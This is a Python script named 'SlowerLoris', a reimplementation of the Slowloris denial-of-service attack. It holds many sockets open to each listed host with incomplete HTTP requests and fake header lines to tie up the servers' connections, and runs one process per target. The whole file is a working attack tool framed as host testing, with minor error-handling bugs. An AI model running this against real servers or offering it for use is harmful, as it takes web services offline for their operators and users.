#!/usr/bin/python
import socket
import argparse
import random
import time
import multiprocessing


def new_socket(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 9001)).encode("utf-8"))
    except (socket.error, msg):
        print('Failed to create socket, error=' + str(msg[0])) + ' ' + str(msg[1])
        return False
    return s


def keep_alive(opensockets, nsockets, host, port):
    print('Starting keep-alive for: {}'.format(host))
    while True:
        for sock in opensockets:
            try:
                sock.send("X-a: {}\r\n".format(random.randint(1, 9001)).encode("utf-8"))
            except socket.error:
                opensockets.remove(sock)

        if len(opensockets) < nsockets:
            for n in range(nsockets):
                s = new_socket(host, port)
                if s:
                    opensockets.append(s)
                else:
                    break
        time.sleep(15)


def main(args):
    hosts = args.hostnames
    port = args.port
    nsockets = args.sockets

    for host in hosts:
        opensockets = []
        for n in range(nsockets):
            s = new_socket(host, port)
            if s:
                opensockets.append(s)
            else:
                break
        print(host)
        print('Successfully opened {} sockets out of {}'.format(len(opensockets), nsockets))
        process = multiprocessing.Process(target=keep_alive,
			                              args=(opensockets, nsockets, host, port))
        process.start()


parser = argparse.ArgumentParser(description='SlowerLoris: python cl reimplementation of slowloris, uses multiprocessing to test multiple hosts')
parser.add_argument('hostnames', nargs="+", type=str, help='list of hosts to test spawns a process for each')
parser.add_argument('-p', '--port', nargs="?", type=int, default=80, help='target port')
parser.add_argument('-s', '--sockets', nargs="?", type=int, default=150, help='# of sockets, default 150')
args = parser.parse_args()

if __name__ == "__main__":
    main(args)
